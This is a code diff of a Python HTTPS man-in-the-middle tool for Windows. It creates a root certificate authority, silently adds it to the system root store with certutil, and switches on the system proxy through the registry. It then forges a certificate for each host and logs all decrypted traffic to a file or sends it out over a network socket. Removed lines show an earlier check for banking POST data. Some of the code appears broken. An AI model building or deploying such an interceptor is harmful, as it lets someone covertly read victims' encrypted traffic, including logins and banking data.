@@ -1,5 +1,5 @@
 from __future__ import annotations
-
+from consts import *
 import os
 import random
 import ssl
@@ -7,21 +7,21 @@ from typing import Tuple, Optional, Union, TextIO
 from mitm import MITM, middleware, Connection, protocol, crypto, __data__
 from mitm.crypto import new_RSA
 from mitm.crypto import crypto as cr
-
-from network import send
+# from network import send
 from socket import socket
 from threading import Thread
-import sys
+# import sys
 import winreg
 from asyncio import CancelledError
 import pathlib
-import certifi
+# import certifi
 from OpenSSL import crypto as cry
 
 my_socket: Optional[socket] = None
 file: Optional[TextIO] = None
 mitm: Optional[MITM] = None
-installed_hosts = []
+
+installed_hosts = {}
 
 
 def new_X509(
@@ -113,111 +113,146 @@ async def new_pair(
     return key, crt
 
 
+# async def create_crypto(host: str, connection=None) -> ssl.SSLContext:
+#     print("1")
+#     rsa_key, rsa_cert = __data__ / f"{host}.key", __data__ / f"{host}.crt"
+#     print("2")
+#     await new_pair(host, key_path=rsa_key, cert_path=rsa_cert)
+#     print("3")
+#     context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+#     print("4")
+#     context.load_cert_chain(certfile=rsa_cert, keyfile=rsa_key)
+#     if connection:
+#         connection.ssl_context = context
+#     print(rsa_cert)
+#     install_cert(rsa_cert)
+#     #os.remove(rsa_key)
+#     #os.remove(rsa_cert)
+#     installed_hosts[host] = context
+#     return context
+
+
+async def create_root(ca_path: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME, common_name=PROJECT_NAME):
+    os.system(f'openssl genrsa -out "{ca_path}.key" 4096')
+    os.system(f'openssl req -x509 -new -nodes -key "{ca_path}.key" -sha256 -days 1024 '
+              f'-subj "/C={country}/ST={state}/O={organiztion}/CN={common_name}" -out "{ca_path}.crt"')
+    os.system(f'certutil -addstore root "{ca_path}.crt"')
+
+
+async def new_pair2(host: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME):
+    ca_path = f"{ROOT_DIRECTORY}\\{ROOT_CA_NAME}"
+    host_path = f"{ROOT_DIRECTORY}\\{host}"
+    os.system(f'openssl genrsa -out "{host_path}.key" 2048')
+    with open(f"{host_path}.conf", "wt") as f:
+        f.write(f"[req]\n"
+                f"default_bits = 2048\n"
+                f"prompt = no\n"
+                f"default_md = sha256\n"
+                f"req_extensions = req_ext\n"
+                f"distinguished_name = dn\n"
+                f"[dn]\n"
+                f"C = {country}\n"
+                f"ST = {state}\n"
+                f"O = {organiztion}\n"
+                f"emailAddress = flikhamud123@gmail.com\n"
+                f"CN = {host}\n"
+                f"[req_ext]\n"
+                f"subjectAltName = @alt_names\n"
+                f"[alt_names]\n"
+                f"DNS.1 = {host}")
+    os.system(f'openssl req -new -sha256 -key "{host_path}.key" '
+              f'-subj "/C={country}/ST={state}/O={organiztion}/CN={host}" '
+              f'-config "{host_path}.conf" '
+              f'-out "{host_path}.csr"')
+    #os.system(f"openssl req -in {host}.csr -noout -text")
+    os.system(f'openssl x509 -req -in "{host_path}.csr" '
+              f'-extfile "{host_path}.conf" -extensions req_ext'
+              f' -CA "{ca_path}.crt" -CAkey "{ca_path}.key" -CAcreateserial -out "{host_path}.crt" -days 500 -sha256')
+    #os.system(f"openssl x509 -in {host}.crt -text -noout")
+
+
+async def create_crypto2(host: str):
+    a = await new_pair2(host)
+    print(a)
+    context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+    context.load_cert_chain(certfile=f"{ROOT_DIRECTORY}\\{host}.crt", keyfile=f"{ROOT_DIRECTORY}\\{host}.key")
+    install_cert(f"{ROOT_DIRECTORY}\\{host}.crt")
+    #os.remove(rsa_key)
+    #os.remove(rsa_cert)
+    installed_hosts[host] = context
+
+
 async def start_connection(connection: Connection, data):
-    print("what")
+    #print("what")
     if b"CONNECT" in data:
         print("whatttt")
         host = str(data[data.find(b" ")+1: data.find(b":")])[2:-1]
         print("OK")
     else:
         return
-    print("Wow")
+    #print("Wow")
     if host not in installed_hosts:
-        print("1")
-        rsa_key, rsa_cert = __data__ / f"{host}.key", __data__ / f"{host}.crt"
-        print("2")
-        await new_pair(host, key_path=rsa_key, cert_path=rsa_cert)
-        print("3")
-        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-        print("4")
-        context.load_cert_chain(certfile=rsa_cert, keyfile=rsa_key)
-        connection.ssl_context = context
-        print(rsa_cert)
-        install_cert(rsa_cert)
-        os.remove(rsa_key)
-        os.remove(rsa_cert)
-        installed_hosts.append(host)
+        await create_crypto2(host)
+    connection.ssl_context = installed_hosts[host]
 
 
-class FileLog(middleware.Middleware):
-    @staticmethod
-    async def mitm_started(host: str, port: int):
-        file.write("MITM started on %s:%d.\n" % (host, port))
+class HttpsLogger(middleware.Middleware):
+    @classmethod
+    async def mitm_started(cls, host: str, port: int):
+        await cls.write(f"MITM started on {host}:{port}.\n")
         print("MITM started on %s:%d.\n" % (host, port))
+        await create_root(f"{ROOT_DIRECTORY}\\{ROOT_CA_NAME}")
 
-    @staticmethod
-    async def client_connected(connection: Connection):
+    @classmethod
+    async def client_connected(cls, connection: Connection):
         host, port = connection.client.writer._transport.get_extra_info("peername")
-        file.write("Client %s:%i has connected.\n" % (host, port))
+        await cls.write(f"Client {host}:{port} has connected.\n")
         print("Client %s:%i has connected.\n" % (host, port))
 
-    @staticmethod
-    async def server_connected(connection: Connection):
+    @classmethod
+    async def server_connected(cls, connection: Connection):
         host, port = connection.server.writer._transport.get_extra_info("peername")
-        file.write("Connected to server %s:%i.\n" % (host, port))
+        await cls.write(f"Connected to server {host}:{port}.\n")
         print("Connected to server %s:%i.\n" % (host, port))
 
-    @staticmethod
-    async def client_data(connection: Connection, data: bytes) -> bytes:
-        file.write("Client to server: \n\n\t%s\n" % data)
-        # print("Client to server: \n\n\t%s\n" % data)
+    @classmethod
+    async def client_data(cls, connection: Connection, data: bytes) -> bytes:
+        await cls.write(f"Client to server: \n\n\t{data}\n")
+        print("Client to server: \n\n\t%s\n" % data)
         await start_connection(connection, data)
-        if b"bank" in data and b"post" in data:
-            print(data)
-        else:
-            print(data)
         return data
 
-    @staticmethod
-    async def server_data(connection: Connection, data: bytes) -> bytes:
-        file.write("Server to client: \n\n\t%s\n" % data)
-        # print("Server to client: \n\n\t%s\n" % data)
+    @classmethod
+    async def server_data(cls, connection: Connection, data: bytes) -> bytes:
+        await cls.write(f"Server to client: \n\n\t{data}\n")
+        print("Server to client: \n\n\t%s\n" % data)
         return data
 
-    @staticmethod
-    async def client_disconnected(connection: Connection):
-        file.write("Client has disconnected.\n")
+    @classmethod
+    async def client_disconnected(cls, connection: Connection):
+        await cls.write("Client has disconnected.\n")
         # print("Client has disconnected.\n")
 
-    @staticmethod
-    async def server_disconnected(connection: Connection):
-        file.write("Server has disconnected.")
+    @classmethod
+    async def server_disconnected(cls, connection: Connection):
+        await cls.write("Server has disconnected.")
         # print("Server has disconnected.")
 
-
-class NetLog(middleware.Middleware):
     @staticmethod
-    async def mitm_started(host: str, port: int):
-        send("MITM started on %s:%d." % (host, port), my_socket)
+    async def write(info: str):
+        raise NotImplementedError
 
-    @staticmethod
-    async def client_connected(connection: Connection):
-        host, port = connection.client.writer._transport.get_extra_info("peername")
-        send("Client %s:%i has connected." % (host, port), my_socket)
 
+class FileLog(HttpsLogger):
     @staticmethod
-    async def server_connected(connection: Connection):
-        host, port = connection.server.writer._transport.get_extra_info("peername")
-        send("Connected to server %s:%i." % (host, port), my_socket)
+    async def write(info: str):
+        file.write(info)
 
-    @staticmethod
-    async def client_data(connection: Connection, data: bytes) -> bytes:
-        await start_connection(connection, data)
-        send("Client to server: \n\n\t%s\n" % data, my_socket)
-        return data
 
+class NetLog(HttpsLogger):
     @staticmethod
-    async def server_data(connection: Connection, data: bytes) -> bytes:
-        send("Server to client: \n\n\t%s\n" % data, my_socket)
-        return data
-
-    @staticmethod
-    async def client_disconnected(connection: Connection):
-        send("Client has disconnected.", my_socket)
-
-    @staticmethod
-    async def server_disconnected(connection: Connection):
-        send("Server has disconnected.", my_socket)
+    async def write(info: str):
+        send(info, my_socket)
 
 
 def set_reg(name, value, size):
@@ -226,7 +261,8 @@ def set_reg(name, value, size):
         winreg.SetValueEx(registry_key, name, 0, size, value)
         winreg.CloseKey(registry_key)
         return True
-    except WindowsError:
+    except WindowsError as e:
+        print(e)
         return False
 
 
@@ -285,8 +321,9 @@ def __start() -> bool:
                 protocols=[protocol.HTTP],
                 buffer_size=8192,
                 timeout=5,
-                ssl_context=crypto.mitm_ssl_default_context())
-    install_cert()
+                ssl_context=create_crypto2("google.com"))
+    crypto.mitm_ssl_default_context()
+    #install_cert()
     try:
         mitm.run()
     except CancelledError:
@@ -310,3 +347,11 @@ def stop_sniffing() -> bool:
     set_reg("ProxyEnable", 0, winreg.REG_DWORD)
     return True
 
+
+if __name__ == "__main__":
+    filestart("logger.txt")
+    print("started")
+    # input()
+    # # time.sleep(3)
+    # stop_sniffing()
+    # print("stopped")
